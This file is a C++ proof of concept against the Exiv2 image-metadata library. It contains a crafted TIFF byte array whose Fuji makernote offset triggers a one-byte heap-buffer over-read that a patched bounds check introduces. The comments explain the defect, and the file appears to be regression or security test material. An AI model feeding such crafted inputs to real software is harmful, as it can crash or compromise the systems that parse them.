// PoC for the memory-safety defect introduced in TiffReader::visitIfdMakernote.
//
// Drives the public Exiv2 API (ImageFactory::open + Image::readMetadata) with an
// in-contract, crafted TIFF whose Fuji makernote header declares an IFD offset
// that lands on the very last byte of the data buffer. The patched bounds check
// (ifdOffset() < bytesRemaining) only guarantees a single byte at that offset,
// but the makernote IFD entry count is then read as a 2-byte value, so the
// second byte is read one past the end of the buffer -> AddressSanitizer
// heap-buffer-overflow.
//
// On the parent tree the makernote IFD start is handed straight to the directory
// reader, which refuses to read the entry count when fewer than 2 bytes remain,
// so no out-of-bounds access occurs.

#include <exiv2/exiv2.hpp>

#include <cstdlib>
#include <cstring>

static const unsigned char kPoc[] = {
    73, 73, 42, 0, 8, 0, 0, 0, 2, 0, 15, 1, 2, 0, 9, 0,
    0, 0, 38, 0, 0, 0, 105, 135, 4, 0, 1, 0, 0, 0, 47, 0,
    0, 0, 0, 0, 0, 0, 70, 85, 74, 73, 70, 73, 76, 77, 0, 1,
    0, 124, 146, 7, 0, 30, 0, 0, 0, 65, 0, 0, 0, 0, 0, 0,
    0, 70, 85, 74, 73, 70, 73, 76, 77, 29, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

int main() {
  Exiv2::LogMsg::setLevel(Exiv2::LogMsg::mute);
  const std::size_t n = sizeof(kPoc);
  auto* buf = static_cast<unsigned char*>(std::malloc(n));
  std::memcpy(buf, kPoc, n);
  try {
    auto image = Exiv2::ImageFactory::open(buf, n);
    image->readMetadata();
  } catch (...) {
  }
  std::free(buf);
  return 0;
}
